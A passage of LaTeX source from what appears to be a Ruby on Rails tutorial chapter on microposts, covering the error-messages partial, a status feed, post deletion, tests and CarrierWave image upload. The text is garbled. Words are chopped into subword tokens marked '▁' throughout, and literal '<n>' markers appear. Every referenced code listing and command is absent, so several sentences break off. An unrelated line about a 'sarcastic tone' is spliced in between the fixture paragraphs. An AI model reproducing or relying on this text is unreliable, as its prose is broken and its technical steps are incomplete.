▁The ▁second ▁change ▁needed ▁to ▁get ▁Listing ~\ ref { code : micropost _ form } ▁to ▁work ▁is ▁to ▁re define ▁the ▁error - messages ▁partial ▁so ▁the ▁following ▁code ▁from ▁Listing ~\ ref { code : micropost _ form } ▁works :
▁You ▁may ▁recall ▁from ▁Listing ~\ ref { code : f _ error _ messages } ▁that ▁the ▁error - messages ▁partial ▁reference s ▁the ▁\ k ode {@ user } ▁variable ▁explicitly , ▁but ▁in ▁the ▁present ▁case ▁we ▁have ▁an ▁\ k ode {@ micropost } ▁variable ▁instead .
▁To ▁un ify ▁these ▁cases , ▁we ▁can ▁pass ▁the ▁form ▁variable ~\ k ode { f } ▁to ▁the ▁partial ▁and ▁access ▁the ▁ associated ▁object ▁through ▁\ k ode { f . object }, ▁so ▁that ▁in
▁\ k ode { f . object } ▁is ▁\ k ode {@ user }, ▁and ▁in
▁\ k ode { f . object } ▁is ▁\ k ode {@ micropost }, ▁etc .
▁To ▁pass ▁the ▁object ▁to ▁the ▁partial , ▁we ▁use ▁a ▁hash ▁with ▁value ▁equal ▁to ▁the ▁object ▁and ▁key ▁equal ▁to ▁the ▁desired ▁name ▁of ▁the ▁variable ▁in ▁the ▁partial , ▁which ▁is ▁what ▁the ▁second ▁line ▁in ▁Listing ~\ ref { code : micropost _ form } ▁accomplish es .
▁In ▁other ▁words , ▁\ k ode { object : ▁f . object } ▁creates ▁a ▁variable ▁called ▁\ k ode { object } ▁in ▁the ▁\ k ode { error \_ messages } ▁partial , ▁and ▁we ▁can ▁use ▁it ▁to ▁construct ▁a ▁customize d ▁error ▁message , ▁as ▁show n ▁in ▁Listing ~\ ref { code : updated _ error _ messages _ partial }.
▁ Error ▁messages ▁that ▁work ▁with ▁other ▁objects .
▁This ▁is ▁a ▁hint ▁that ▁we ▁need ▁to ▁update ▁the ▁other ▁occur r ence s ▁of ▁the ▁error - messages ▁partial , ▁which ▁we ▁used ▁when ▁sign ing ▁up ▁users ▁( Listing ~\ ref { code : f _ error _ messages }), ▁reset ting ▁passwords ▁( Listing ~\ ref { code : password _ reset _ form }), ▁and ▁editing ▁users ▁( Listing ~\ ref { code : user _ edit _ view }).
▁The ▁updated ▁versions ▁are ▁show n ▁in ▁Listing ~\ ref { code : signup _ errors _ updated }, ▁Listing ~\ ref { code : password _ reset _ updated }, ▁and ▁Listing ~\ ref { code : edit _ errors _ updated }.
▁ Updating ▁the ▁rendering ▁of ▁user ▁signup ▁errors .
▁ Updating ▁the ▁errors ▁for ▁editing ▁users .
▁ Updating ▁the ▁errors ▁for ▁password ▁resets .
▁At ▁this ▁point , ▁all ▁the ▁tests ▁should ▁be ▁\ passing :
▁Add it ion ally , ▁all ▁the ▁HTML ▁in ▁this ▁section ▁should ▁render ▁properly , ▁show ing ▁the ▁form ▁as ▁in ▁F igure ~\ ref { fig : home _ with _ form }, ▁and ▁a ▁form ▁with ▁a ▁submission ▁error ▁as ▁in ▁F igure ~\ ref { fig : home _ form _ errors }.
▁The ▁Home ▁page ▁with ▁a ▁new ▁micropost ▁form .
▁The ▁Home ▁page ▁with ▁a ▁form ▁error .
▁A lthough ▁the ▁micropost ▁form ▁is ▁actually ▁now ▁working , ▁users ▁can ' t ▁immediately ▁see ▁the ▁results ▁of ▁a ▁successful ▁submission ▁because ▁the ▁current ▁Home ▁page ▁does n ' t ▁display ▁any ▁microposts .
▁If ▁you ▁like , ▁you ▁can ▁verify ▁that ▁the ▁form ▁show n ▁in ▁F igure ~\ ref { fig : home _ with _ form } ▁is ▁working ▁by ▁ submitting ▁a ▁valid ▁entry ▁and ▁the n ▁navigat ing ▁to ▁the ▁\ href { http :// localhost :3000/ users /1}{ profile ▁page } ▁to ▁see ▁the ▁post , ▁but ▁that ' s ▁rather ▁cumbersome .
▁It ▁would ▁be ▁far ▁better ▁to ▁have ▁a ▁\ emph { feed } ▁of ▁microposts ▁that ▁includes ▁the ▁user ' s ▁own ▁posts , ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : proto _ feed _ mockup }.
▁( In ▁Chapter ~\ ref { cha : following _ users }, ▁we ' ll ▁general ize ▁this ▁feed ▁to ▁include ▁the ▁microposts ▁of ▁users ▁being ▁\ emph { followed } ▁by ▁the ▁current ▁user .)
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁proto - feed .
▁S ince ▁each ▁user ▁should ▁have ▁a ▁feed , ▁we ▁are ▁ l ed ▁natural ly ▁to ▁a ▁\ k ode { feed } ▁method ▁in ▁the ▁User ▁model , ▁which ▁will ▁initially ▁just ▁select ▁all ▁the ▁microposts ▁ belonging ▁to ▁the ▁current ▁user .
▁We ' ll ▁accomplish ▁this ▁using ▁the ▁\ k ode { where } ▁method ▁on ▁the ▁\ k ode { Micropost } ▁model ▁( see n ▁brief ly ▁before ▁in ▁Section ~\ ref { sec : activation _ resets _ exercises }), ▁as ▁show n ▁in ▁Listing ~\ ref { code : proto _ status _ feed }
▁See ▁the ▁Rails ▁G u id e ▁on ▁the ▁\ href { http :// guides . rubyonrails . org / active _ record _ query ing . html }{ Active ▁Record ▁ Query ▁In ter fa ce } ▁for ▁more ▁on ▁\ k ode { where } ▁and ▁related ▁methods .
▁A ▁pre li m in ary ▁implementation ▁for ▁the ▁micropost ▁status ▁feed .
▁# ▁Defin es ▁a ▁proto - feed .
▁# ▁See ▁" Follow ing ▁users " ▁for ▁the ▁full ▁implementation .
▁The ▁question ▁mark ▁in
▁ensure s ▁that ▁\ k ode { id } ~ is ▁properly ▁\ emph { escape d } ▁before ▁being ▁included ▁in ▁the ▁under ly ing ▁SQL ▁query , ▁there by ▁avoid ing ▁a ▁serious ▁security ▁hole ▁called ▁\ href { http :// en . wiki p edia . org / wiki / SQL _ in j ection }{\ emph { SQL ▁injection } }.
▁The ▁\ k ode { id } ▁attribute ▁here ▁is ▁just ▁an ▁integer ▁( i . e . , ▁\ k ode { self . id }, ▁the ▁unique ▁ ID ▁of ▁the ▁user ), ▁so ▁there ▁is ▁no ▁ danger ▁of ▁SQL ▁injection ▁in ▁this ▁case , ▁but ▁\ emph { always } ▁es ca p ing ▁variables ▁inject ed ▁into ▁SQL ▁statement s ▁is ▁a ▁good ▁habit ▁to ▁c ul t i v ate .
▁A ler t ▁readers ▁m ight ▁note ▁at ▁this ▁point ▁that ▁the ▁code ▁in ▁Listing ~\ ref { code : proto _ status _ feed } ▁is ▁essential ly ▁equivalent ▁to ▁writing
▁We ' ve ▁used ▁the ▁code ▁in ▁Listing ~\ ref { code : proto _ status _ feed } ▁instead ▁because ▁it ▁general ize s ▁much ▁more ▁natural ly ▁to ▁the ▁full ▁status ▁feed ▁needed ▁in ▁Chapter ~\ ref { cha : following _ users }.
▁To ▁use ▁the ▁feed ▁in ▁the ▁sample ▁application , ▁we ▁add ▁an ▁\ k ode {@ feed \_ item s } ▁instance ▁variable ▁for ▁the ▁current ▁user ' s ▁( paginate d ) ▁feed , ▁as ▁in ▁Listing ~\ ref { code : feed _ instance _ variable }, ▁and ▁the n ▁add ▁a ▁status ▁feed ▁partial ▁( Listing ~\ ref { code : feed _ partial }) ▁to ▁the ▁Home ▁page ▁( Listing ~\ ref { code : home _ with _ feed }).
▁Note ▁that , ▁now ▁that ▁there ▁are ▁two ▁lines ▁that ▁need ▁to ▁be ▁run ▁when ▁the ▁user ▁is ▁logged ▁in , ▁Listing ~\ ref { code : feed _ instance _ variable } ▁changes
▁from ▁Listing ~\ ref { code : micropost _ instance _ variable } ▁to
▁there by ▁mov ing ▁the ▁condition al ▁from ▁the ▁end ▁of ▁the ▁line ▁to ▁an ▁if - end ▁statement .
▁ Adding ▁a ▁feed ▁instance ▁variable ▁to ▁the ▁\ k ode { home } ▁action .
▁The ▁status ▁feed ▁partial .
▁The ▁status ▁feed ▁partial ▁def ers ▁the ▁rendering ▁to ▁the ▁micropost ▁partial ▁defined ▁in ▁Listing ~\ ref { code : micropost _ partial } :
▁This ▁cause s ▁Rails ▁to ▁look ▁for ▁a ▁partial ▁with ▁the ▁corresponding ▁name ▁in ▁the ▁views ▁directory ▁of ▁the ▁given ▁resource :
▁We ▁can ▁add ▁the ▁feed ▁to ▁the ▁Home ▁page ▁by ▁rendering ▁the ▁feed ▁partial ▁as ▁usual ▁( Listing ~\ ref { code : home _ with _ feed }).
▁The ▁result ▁is ▁a ▁display ▁of ▁the ▁feed ▁on ▁the ▁Home ▁page , ▁as ▁required ▁( F igure ~\ ref { fig : home _ with _ proto _ feed }).
▁ Adding ▁a ▁status ▁feed ▁to ▁the ▁Home ▁page .
▁The ▁Home ▁page ▁with ▁a ▁proto - feed .
▁At ▁this ▁point , ▁creating ▁a ▁new ▁micropost ▁works ▁as ▁expected , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : micropost _ created }.
▁There ▁is ▁one ▁subtlety , ▁though : ▁on ▁\ emph { failed } ▁micropost ▁submission , ▁the ▁Home ▁page ▁expect s ▁an ▁\ k ode {@ feed \_ item s } ▁instance ▁variable , ▁so ▁failed ▁submission s ▁current ly ▁break .
▁The ▁easie st ▁solution ▁is ▁to ▁suppress ▁the ▁feed ▁entire ly ▁by ▁assign ing ▁it ▁an ▁empty ▁array , ▁as ▁show n ▁in ▁Listing ~\ ref { code : microposts _ create _ action _ with _ feed }.
▁( U nfortunately , ▁return ing ▁a ▁ paginate d ▁feed ▁does n ' t ▁work ▁in ▁this ▁case .
▁Implement ▁it ▁and ▁click ▁on ▁a ▁pagination ▁link ▁to ▁see ▁why .)
▁The ▁Home ▁page ▁after ▁creating ▁a ▁new ▁micropost .
▁ Adding ▁an ▁( empty ) ▁\ k ode {@ feed \_ item s } ▁instance ▁variable ▁to ▁the ▁\ k ode { create } ▁action .
▁The ▁last ▁piece ▁of ▁functionality ▁to ▁add ▁to ▁the ▁Microposts ▁resource ▁is ▁the ▁ability ▁to ▁destroy ▁posts .
▁As ▁with ▁user ▁deletion ▁( Section ~\ ref { sec : the _ destroy _ action }), ▁we ▁accomplish ▁this ▁with ▁`` delete '' ▁links , ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : micropost _ delete _ links _ mockup }.
▁Un like ▁that ▁case , ▁which ▁restrict ed ▁user ▁ destruction ▁to ▁admin ▁users , ▁the ▁delete ▁links ▁will ▁work ▁only ▁for ▁microposts ▁created ▁by ▁the ▁current ▁user .
▁A ▁mockup ▁of ▁the ▁proto - feed ▁with ▁micropost ▁delete ▁links .
▁Ou r ▁first ▁step ▁is ▁to ▁add ▁a ▁delete ▁link ▁to ▁the ▁micropost ▁partial ▁as ▁in ▁Listing ~\ ref { code : micropost _ partial }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : micropost _ partial _ with _ delete }
▁ Adding ▁a ▁delete ▁link ▁to ▁the ▁micropost ▁partial .
▁The ▁next ▁step ▁is ▁to ▁define ▁a ▁\ k ode { destroy } ▁action ▁in ▁the ▁Microposts ▁controller , ▁which ▁is ▁analogous ▁to ▁the ▁user ▁case ▁in ▁Listing ~\ ref { code : admin _ destroy _ before _ filter }.
▁The ▁main ▁difference ▁is ▁that , ▁rather ▁than ▁using ▁an ▁\ k ode {@ user } ▁variable ▁with ▁an ▁\ k ode { admin \_ user } ▁before ▁filter , ▁we ' ll ▁find ▁the ▁micropost ▁through ▁the ▁association , ▁which ▁will ▁automatically ▁fail ▁if ▁a ▁user ▁ tries ▁to ▁delete ▁another ▁user ' s ▁micropost .
▁We ' ll ▁put ▁the ▁result ing ▁\ k ode { find } ▁inside ▁a ▁\ k ode { correct \_ user } ▁before ▁filter , ▁which ▁check s ▁that ▁the ▁current ▁user ▁actually ▁has ▁a ▁micropost ▁with ▁the ▁given ▁id .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : microposts _ destroy _ action }
▁The ▁Microposts ▁controller ▁\ k ode { destroy } ▁action .
▁Note ▁that ▁the ▁\ k ode { destroy } ▁method ▁in ▁Listing ~\ ref { code : microposts _ destroy _ action } ▁redirect s ▁to ▁the ▁URL
▁This ▁correspond s ▁to ▁\ text tt { HTTP \_ RE F ER ER }, ▁as ▁defined ▁by ▁the ▁specific ation ▁for ▁HTTP . ▁Note ▁that ▁`` ref er er '' ▁is ▁not ▁a ▁t y p o --- the ▁word ▁is ▁actually ▁m is s p e ll ed ▁in ▁the ▁spec .
▁Rails ▁correct s ▁this ▁error ▁by ▁writing ▁`` ref er r er '' ▁instead .
▁I ▁did n ' t ▁remember ▁off h and ▁how ▁to ▁get ▁this ▁URL ▁inside ▁a ▁Rails ▁application , ▁so ▁I ▁Google d ▁`` rails ▁request ▁previous ▁url '' ▁and ▁found ▁a ▁\ href { http :// stack overflow . com / questions / 4 6 5 2 08 4 / ruby - on - rails - how - do - you - get - the - prev ious - url }{ S t ac k ▁Over flow ▁thread } ▁with ▁the ▁an s w er .
▁This ▁is ▁convenient ▁because ▁microposts ▁appear ▁on ▁both ▁the ▁Home ▁page ▁and ▁on ▁the ▁user ' s ▁profile ▁page , ▁so ▁by ▁using ▁\ k ode { request . ref er r er } ▁we ▁arrange ▁to ▁redirect ▁back ▁to ▁the ▁page ▁is s u ing ▁the ▁delete ▁request ▁in ▁both ▁cases .
▁If ▁the ▁refer r ing ▁URL ▁is ▁\ k ode { nil } ▁( as ▁is ▁the ▁case ▁inside ▁some ▁tests ), ▁Listing ~\ ref { code : microposts _ destroy _ action } ▁set s ▁the ▁\ k ode { root \_ url } ▁as ▁the ▁default ▁using ▁the ▁\ k ode {|| } ▁operator .
▁( Compar e ▁to ▁the ▁default ▁options ▁defined ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in }. )
▁With ▁the ▁code ▁as ▁above , ▁the ▁result ▁of ▁destroying ▁the ▁second - most ▁ recent ▁post ▁appears ▁in ▁F igure ~\ ref { fig : home _ post _ delete }.
▁The ▁Home ▁page ▁after ▁deleting ▁the ▁second - most - recent ▁micropost .
▁With ▁the ▁code ▁in ▁Section ~\ ref { sec : destroy ing _ microposts }, ▁the ▁Micropost ▁model ▁and ▁interface ▁are ▁complete .
▁All ▁that ' s ▁left ▁is ▁writing ▁a ▁short ▁Microposts ▁controller ▁test ▁to ▁check ▁authorization ▁and ▁a ▁micropost ▁integration ▁test ▁to ▁ti e ▁it ▁all ▁together .
▁We ' ll ▁start ▁by ▁adding ▁a ▁few ▁microposts ▁with ▁different ▁own ers ▁to ▁the ▁micropost ▁fixtures , ▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ micropost _ different _ own er }.
▁( We ' ll ▁be ▁using ▁only ▁one ▁for ▁now , ▁but ▁we ' ve ▁put ▁in ▁the ▁other s ▁for ▁future ▁reference .)
▁ Adding ▁a ▁micropost ▁with ▁a ▁different ▁own er .
▁I ' m ▁so r ry .
▁Your ▁words ▁made ▁sense , ▁but ▁your ▁ s ar ca s tic ▁to n e ▁did ▁not .
▁We ▁next ▁write ▁a ▁short ▁test ▁to ▁make ▁sure ▁one ▁user ▁can ' t ▁delete ▁the ▁microposts ▁of ▁a ▁different ▁user , ▁and ▁we ▁also ▁check ▁for ▁the ▁proper ▁redirect , ▁as ▁seen ▁in ▁Listing ~\ ref { code : micropost _ user _ m is match _ test }.
▁Testing ▁micropost ▁deletion ▁with ▁a ▁user ▁m is match .
▁F inally , ▁we ' ll ▁write ▁an ▁integration ▁test ▁to ▁log ▁in , ▁check ▁the ▁micropost ▁pagination , ▁make ▁an ▁invalid ▁submission , ▁make ▁a ▁valid ▁submission , ▁delete ▁a ▁post , ▁and ▁the n ▁visit ▁a ▁second ▁user ' s ▁page ▁to ▁make ▁sure ▁there ▁are ▁no ▁`` delete '' ▁links .
▁We ▁start ▁by ▁ generating ▁a ▁test ▁as ▁usual :
▁The ▁test ▁appears ▁in ▁Listing ~\ ref { code : microposts _ interface _ test }.
▁See ▁if ▁you ▁can ▁connect ▁the ▁lines ▁in ▁Listing ~\ ref { code : micropost _ validity _ test _ id io ma tic } ▁to ▁the ▁steps ▁mentioned ▁above .
▁( Listing ~\ ref { code : microposts _ interface _ test } ▁uses ▁\ k ode { post } ▁followed ▁by ▁\ k ode { follow \_ redirect ! }
▁An ▁integration ▁test ▁for ▁the ▁micropost ▁interface .
▁Because ▁we ▁wrote ▁working ▁application ▁code ▁first , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁Now ▁that ▁we ' ve ▁added ▁support ▁for ▁all ▁relevant ▁micropost ▁actions , ▁in ▁this ▁section ▁we ' ll ▁make ▁it ▁possible ▁for ▁microposts ▁to ▁include ▁images ▁as ▁well ▁as ▁text .
▁We ' ll ▁start ▁with ▁a ▁basic ▁version ▁good ▁enough ▁for ▁development ▁use , ▁and ▁the n ▁add ▁a ▁series ▁of ▁ en h ance ment s ▁to ▁make ▁image ▁upload ▁production - read y .
▁ Adding ▁image ▁upload ▁involve s ▁two ▁main ▁visible ▁elements : ▁a ▁form ▁field ▁for ▁upload ing ▁an ▁image ▁and ▁the ▁micropost ▁images ▁themselves .
▁A ▁mockup ▁of ▁the ▁result ing ▁`` U p load ▁image '' ▁button ▁and ▁micropost ▁ photo ▁appears ▁in ▁F igure ~\ ref { fig : micropost _ image _ mockup }
▁A ▁mockup ▁of ▁micropost ▁image ▁upload ▁( with ▁an ▁uploaded ▁image ).
▁\ label { fig : micropost _ image _ mockup } }< n >\ end { figure }< n >< n >\ subsection { B as ic ▁image ▁upload } ▁% ▁( fold )< n >\ label { sec : basic _ image _ upload }< n >< n >
▁To ▁handle ▁an ▁uploaded ▁image ▁and ▁associate ▁it ▁with ▁the ▁Micropost ▁model , ▁we ' ll ▁use ▁the ▁\ href { https :// github . com / carrierwave uploader / carrierwave }{ CarrierWave } ▁image ▁ uploader .
▁For ▁completeness , ▁Listing ~\ ref { code : gemfile _ carrierwave } ▁also ▁includes ▁the ▁\ text tt { mini \_ magic k } ▁and ▁\ text tt { f o g } ▁gems ▁needed ▁for ▁image ▁ resizing ▁( Section ~\ ref { sec : image _ resizing }) ▁and ▁image ▁upload ▁in ▁production ▁( Section ~\ ref { sec : image _ upload _ in _ production }).
▁Then ▁we ▁install ▁as ▁usual :
▁ CarrierWave ▁add s ▁a ▁Rails ▁generator ▁for ▁creating ▁an ▁image ▁ uploader , ▁which ▁we ' ll ▁use ▁to ▁make ▁an ▁ uploader ▁for ▁an ▁image ▁called ▁\ k ode { picture }
▁ Initial ly , ▁I ▁called ▁the ▁new ▁attribute ▁\ k ode { image }, ▁but ▁that ▁name ▁was ▁so ▁generic ▁it ▁end ed ▁up ▁being ▁confusing .
▁Imag es ▁uploaded ▁with ▁ CarrierWave ▁should ▁be ▁ associated ▁with ▁a ▁corresponding ▁attribute ▁in ▁an ▁Active ▁Record ▁model , ▁which ▁simply ▁contains ▁the ▁name ▁of ▁the ▁image ▁file ▁in ▁a ▁string ▁field .
▁The ▁result ing ▁a ug ment ed ▁data ▁model ▁for ▁microposts ▁appears ▁in ▁F igure ~\ ref { fig : micropost _ model _ picture }.
▁The ▁Micropost ▁data ▁model ▁with ▁a ▁\ k ode { picture } ▁attribute .
▁To ▁add ▁the ▁required ▁\ k ode { picture } ▁attribute ▁to ▁the ▁Micropost ▁model , ▁we ▁generate ▁a ▁migration ▁and ▁ migrate ▁the ▁development ▁database :
▁The ▁way ▁to ▁tell ▁ CarrierWave ▁to ▁associate ▁the ▁image ▁with ▁a ▁model ▁is ▁to ▁use ▁the ▁\ k ode { m o un t \_ uploader } ▁method , ▁which ▁take s ▁as ▁arguments ▁a ▁symbol ▁represent ing ▁the ▁attribute ▁and ▁the ▁class ▁name ▁of ▁the ▁generated ▁ uploader :
▁( Here ▁\ k ode { P ic t ure U p load er } ▁is ▁defined ▁in ▁the ▁file ▁\ k ode { picture \_ uploader . rb }, ▁\ line break ▁which ▁we ' ll ▁start ▁editing ▁in ▁Section ~\ ref { sec : image _ validation }, ▁but ▁for ▁now ▁the ▁generated ▁default ▁is ▁fine .)
▁ Adding ▁the ▁ uploader ▁to ▁the ▁Micropost ▁model ▁gives ▁the ▁code ▁show n ▁in ▁Listing ~\ ref { code : micropost _ model _ picture }.
▁ Adding ▁an ▁image ▁to ▁the ▁Micropost ▁model .
▁On ▁some ▁systems , ▁you ▁may ▁need ▁to ▁restart ▁the ▁Rails ▁server ▁at ▁this ▁point ▁to ▁keep ▁the ▁test ▁suite ▁\ passing .
▁( If ▁you ' re ▁using ▁Guard ▁as ▁describe d ▁in ▁Section ~\ ref { sec : guard }, ▁you ▁may ▁need ▁to ▁restart ▁that ▁as ▁well , ▁and ▁it ▁may ▁even ▁be ▁necessary ▁to ▁exit ▁the ▁terminal ▁ s hel l ▁and ▁re - ru n ▁Guard ▁in ▁a ▁new ▁one .)
▁To ▁include ▁the ▁ uploader ▁on ▁the ▁Home ▁page ▁as ▁in ▁F igure ~\ ref { fig : micropost _ image _ mockup }, ▁we ▁need ▁to ▁include ▁a ▁\ k ode { file \_ field } ▁tag ▁in ▁the ▁micropost ▁form , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ create _ image _ upload }.
▁ Adding ▁image ▁upload ▁to ▁the ▁micropost ▁create ▁form .
▁Note ▁the ▁inclusion ▁of
▁in ▁the ▁arguments ▁to ▁\ k ode { form \_ for }, ▁which ▁is ▁necessary ▁for ▁file ▁upload s .
▁F inally , ▁we ▁need ▁to ▁add ▁\ k ode { picture } ▁to ▁the ▁list ▁of ▁attributes ▁ permitted ▁to ▁be ▁modified ▁through ▁the ▁web .
▁This ▁involve s ▁editing ▁the ▁\ k ode { micropost \_ params } ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ params _ picture }.
▁ Adding ▁\ k ode { picture } ▁to ▁the ▁list ▁of ▁ permitted ▁attributes .
▁On ce ▁the ▁image ▁has ▁been ▁uploaded , ▁we ▁can ▁render ▁it ▁using ▁the ▁\ k ode { image \_ tag } ▁helper ▁in ▁the ▁micropost ▁partial , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ partial _ image _ display }.
▁Noti ce ▁the ▁use ▁of ▁the ▁\ k ode { picture ?}\ ▁boolean ▁method ▁to ▁prevent ▁display ing ▁an ▁image ▁tag ▁when ▁there ▁is n ' t ▁an ▁image .
▁This ▁method ▁is ▁created ▁automatically ▁by ▁ CarrierWave ▁base d ▁on ▁the ▁name ▁of ▁the ▁image ▁attribute .
▁The ▁result ▁of ▁making ▁a ▁successful ▁submission ▁by ▁hand ▁appears ▁in ▁F igure ~\ ref { fig : micropost _ with _ image }.
▁Writ ing ▁an ▁automate d ▁test ▁for ▁image ▁upload ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : micropost _ exercises }).
▁ Adding ▁image ▁display ▁to ▁microposts .
▁The ▁result ▁of ▁ submitting ▁a ▁micropost ▁with ▁an ▁image .
▁The ▁ uploader ▁in ▁Section ~\ ref { sec : basic _ image _ upload } ▁is ▁a ▁good ▁start , ▁but ▁it ▁has ▁significant ▁limit ation s .
▁In ▁particular , ▁it ▁does n ' t ▁enforce ▁any ▁constraints ▁on ▁the ▁uploaded ▁file , ▁which ▁can ▁cause ▁problem s ▁if ▁users ▁try ▁to ▁upload ▁large ▁files ▁of ▁invalid ▁file ▁types .
▁To ▁re m ed y ▁this ▁def ec t , ▁we ' ll ▁add ▁validations ▁for ▁the ▁image ▁size ▁and ▁format , ▁both ▁on ▁the ▁server ▁and ▁on ▁the ▁client ▁( i . e . , ▁in ▁the ▁browser ).
▁The ▁first ▁image ▁validation , ▁which ▁restrict s ▁upload s ▁to ▁valid ▁image ▁types , ▁appears ▁in ▁the ▁ CarrierWave ▁ uploader ▁itself .
▁The ▁result ing ▁code ▁( which ▁appears ▁as ▁a ▁comment ed - out ▁suggest ion ▁in ▁the ▁generated ▁ uploader ) ▁verifie s ▁that ▁the ▁image ▁filename ▁end s ▁with ▁a ▁valid ▁image ▁extension ▁( P N G , ▁G I F , ▁and ▁both ▁variant s ▁of ▁ J P E G ), ▁as ▁show n ▁in ▁Listing ~\ ref { code : validate _ picture _ format }.
▁The ▁ picture ▁format ▁validation .
▁The ▁second ▁validation , ▁which ▁control s ▁the ▁size ▁of ▁the ▁image , ▁appears ▁in ▁the ▁Micropost ▁model ▁itself .
▁In ▁contrast ▁to ▁previous ▁model ▁validations , ▁file ▁size ▁validation ▁does n ' t ▁correspond ▁to ▁a ▁built - in ▁Rails ▁validator .
▁As ▁a ▁result , ▁valid at ing ▁images ▁requires ▁defin ing ▁a ▁custom ▁validation , ▁which ▁we ' ll ▁call ▁\ k ode { picture \_ size } ▁and ▁define ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ model _ image _ validation }.
▁Note ▁the ▁use ▁of ▁\ k ode { validate } ▁( as ▁oppos ed ▁to ▁\ k ode { validates }) ▁to ▁call ▁a ▁custom ▁validation .
▁ Adding ▁validations ▁to ▁images .
▁This ▁custom ▁validation ▁arrange s ▁to ▁call ▁the ▁method ▁corresponding ▁to ▁the ▁given ▁symbol ▁(\ k ode { : picture \_ size }).
▁To ▁go ▁along ▁with ▁the ▁validations ▁in ▁Listing ~\ ref { code : validate _ picture _ format } ▁and ▁Listing ~\ ref { code : micropost _ model _ image _ validation }, ▁we ' ll ▁add ▁two ▁client - side ▁check s ▁on ▁the ▁uploaded ▁image .
▁We ' ll ▁first ▁m ir r or ▁the ▁format ▁validation ▁by ▁using ▁the ▁\ k ode { accept } ▁parameter ▁in ▁the ▁\ k ode { file \_ field } ▁input ▁tag :
▁The ▁valid ▁format s ▁consist ▁of ▁the ▁\ href { https :// en . wiki p edia . org / wiki / Internet _ m edia _ type }{ M I ME ▁types } ▁accepted ▁by ▁the ▁validation ▁in ▁Listing ~\ ref { code : validate _ picture _ format }.
▁Next , ▁we ' ll ▁include ▁a ▁little ▁JavaScript ▁( or , ▁more ▁specifically , ▁\ href { http :// jquery . com /}{ j Query }) ▁to ▁issue ▁an ▁ alert ▁if ▁a ▁user ▁ tries ▁to ▁upload ▁an ▁image ▁that ' s ▁too ▁big ▁( which ▁prevent s ▁accidental ▁time - co n sum ing ▁upload s ▁and ▁light en s ▁the ▁load ▁on ▁the ▁server ) :
▁in ▁Listing ~\ ref { code : micropost _ create _ image _ upload }.
▁( The ▁way ▁to ▁ figure ▁this ▁out ▁is ▁to ▁ Ctrl - click ▁and ▁use ▁your ▁browser ' s ▁web ▁ inspect or .)
▁When ▁the ▁element ▁with ▁that ▁CSS ~ id ▁changes , ▁the ▁jQuery ▁function ▁fire s ▁and ▁issues ▁the ▁\ k ode { alert } ▁method ▁if ▁the ▁file ▁is ▁too ▁big
▁To ▁learn ▁how ▁to ▁do ▁things ▁like ▁this , ▁you ▁can ▁do ▁what ▁I ▁did : ▁Google ▁around ▁for ▁things ▁like ▁`` javascript ▁ maximum ▁file ▁size '' ▁un til ▁you ▁find ▁something ▁on ▁S t ac k ▁Over flow .
▁The ▁result ▁of ▁adding ▁these ▁ additional ▁check s ▁appears ▁in ▁Listing ~\ ref { code : _ format _ jquery _ file _ test }.
▁Check ing ▁the ▁file ▁size ▁with ▁jQuery .
▁It ' s ▁important ▁to ▁understand ▁that ▁code ▁like ▁that ▁show n ▁in ▁Listing ~\ ref { code : _ format _ jquery _ file _ test } ▁can ' t ▁actually ▁prevent ▁a ▁user ▁from ▁try ing ▁to ▁upload ▁a ▁file ▁that ' s ▁too ▁big .
▁Even ▁if ▁our ▁code ▁prevent s ▁them ▁from ▁ submitting ▁it ▁through ▁the ▁web , ▁they ▁could ▁always ▁edit ▁the ▁JavaScript ▁with ▁a ▁web ▁ inspect or ▁or ▁issue ▁a ▁direct ▁\ text tt { POST } ▁request ▁using , ▁e . g . , ▁\ k ode { curl }.
▁To ▁prevent ▁users ▁from ▁upload ing ▁arbitrar ily ▁large ▁files , ▁it ▁is ▁thus ▁essential ▁to ▁include ▁a ▁server - side ▁validation , ▁as ▁in ▁Listing ~\ ref { code : micropost _ model _ image _ validation }.
▁The ▁image ▁size ▁validations ▁in ▁Section ~\ ref { sec : image _ validation } ▁are ▁a ▁good ▁start , ▁but ▁they ▁ still ▁allow ▁the ▁upload ing ▁of ▁images ▁large ▁enough ▁to ▁break ▁our ▁site ' s ▁layout , ▁some times ▁with ▁f right en ing ▁results ▁( F igure ~\ ref { fig : large _ upload ed _ image }).
▁Thus , ▁while ▁it ' s ▁convenient ▁to ▁allow ▁users ▁to ▁select ▁fai r ly ▁large ▁images ▁from ▁their ▁local ▁d is k , ▁it ' s ▁also ▁a ▁good ▁idea ▁to ▁re size ▁the ▁images ▁before ▁display ing ▁them
▁It ' s ▁possible ▁to ▁constrain ▁the ▁\ emph { display } ▁size ▁with ▁CSS , ▁but ▁this ▁does n ' t ▁change ▁the ▁image ▁size .
▁In ▁particular , ▁large ▁images ▁would ▁ still ▁take ▁a ▁while ▁to ▁load .
▁( You ' ve ▁ probably ▁visit ed ▁website s ▁where ▁`` small '' ▁images ▁seem ing ly ▁take ▁for ever ▁to ▁load .
▁This ▁is ▁why .)
▁A ▁f right en ing ly ▁large ▁uploaded ▁image .
▁We ' ll ▁be ▁ resizing ▁images ▁using ▁the ▁image ▁ manipulati on ▁program ▁\ href { http :// www . image magic k . org /}{ Image M a g ic k }, ▁which ▁we ▁need ▁to ▁install ▁on ▁the ▁development ▁environment .
▁( As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : image _ upload _ in _ production }, ▁when ▁using ▁Heroku ▁for ▁deployment ▁ Image M a g ic k ▁comes ▁pre - install ed ▁in ▁production .)
▁On ▁the ▁cloud ▁IDE , ▁we ▁can ▁do ▁this ▁as ▁follows
▁I ▁go t ▁this ▁from ▁the ▁\ href { https :// help . u b un t u . com / com m un ity / Image M a g ic k }{ of fi cial ▁U b un t u ▁documentation }.
